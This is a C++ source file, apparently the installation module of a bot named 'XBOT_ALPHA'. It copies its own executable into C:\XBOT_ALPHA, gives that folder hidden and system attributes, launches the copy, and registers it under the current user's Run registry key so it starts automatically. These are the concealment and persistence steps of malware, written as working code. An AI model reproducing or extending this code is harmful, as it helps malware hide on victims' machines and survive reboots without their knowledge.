#include "stdafx.h"
#include "Installation.h"
#include <winbase.h>


BOOL RegisterMyProgramForStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args)
{
	HKEY hKey = NULL;
	LONG lResult = 0;
	BOOL fSuccess = TRUE;
	DWORD dwSize;

	const size_t count = MAX_PATH * 2;
	wchar_t szValue[count] = {};


	wcscpy_s(szValue, count, L"\"");
	wcscat_s(szValue, count, pathToExe);
	wcscat_s(szValue, count, L"\" ");

	if (args != NULL)
	{
		// caller should make sure "args" is quoted if any single argument has a space
		// e.g. (L"-name \"Mark Voidale\"");
		wcscat_s(szValue, count, args);
	}

	lResult = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);

	fSuccess = (lResult == 0);

	if (fSuccess)
	{
		dwSize = (wcslen(szValue) + 1) * 2;
		lResult = RegSetValueExW(hKey, pszAppName, 0, REG_SZ, (BYTE*)szValue, dwSize);
		fSuccess = (lResult == 0);
	}

	if (hKey != NULL)
	{
		RegCloseKey(hKey);
		hKey = NULL;
	}

	return fSuccess;
}

void Installation::RegisterProgram()
{
	wchar_t szPathToExe[MAX_PATH];
	wchar_t szDesiredPath[MAX_PATH] = L"C:\\XBOT_ALPHA\\xbot.exe";

	
	GetModuleFileNameW(NULL, szPathToExe, MAX_PATH);
	std::wstring A = szPathToExe;
	std::wstring B = szDesiredPath;
	//wprintf(L"\n %s \n", A);
	//wprintf(L" %s \n", B);
	if (A == B)
	{
		RegisterMyProgramForStartup(L"XBOT_ALPHA", szPathToExe, NULL);
		isdestinationdirectory = TRUE;
	}
	else
	{
		CreateDirectory(L"C:\\XBOT_ALPHA", NULL);
		CopyFileW(szPathToExe, szDesiredPath, FALSE);
		SetFileAttributes(L"C:\\XBOT_ALPHA", FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

		PROCESS_INFORMATION pi;
		STARTUPINFOA si;
		ZeroMemory(&pi, sizeof(pi));
		ZeroMemory(&si, sizeof(si));

		CreateProcessA("C:\\XBOT_ALPHA\\xbot.exe",NULL,NULL,NULL,FALSE,0,NULL,"C:\\XBOT_ALPHA\\",&si,&pi);
		isdestinationdirectory = FALSE;
		Sleep(5000);
	}
}

Installation::Installation()
{
	RegisterProgram();
}

bool Installation::IsDestinationDirectoryActive()
{
	return isdestinationdirectory;
}
